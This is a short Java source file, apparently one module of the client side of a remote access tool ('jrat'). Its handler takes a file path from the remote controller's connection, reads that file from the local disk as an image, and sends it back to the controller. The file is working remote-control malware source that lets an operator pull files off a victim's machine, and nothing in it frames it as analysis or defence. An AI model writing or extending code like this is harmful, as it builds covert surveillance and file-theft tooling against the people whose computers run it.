package jrat.module.fs.packets;

import jrat.client.Connection;
import jrat.client.packets.incoming.AbstractIncomingPacket;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.File;

public class Packet62PreviewImage extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String file = con.readLine();

		BufferedImage image = ImageIO.read(new File(file));

		con.addToSendQueue(new Packet43PreviewImage(image));
	}

}
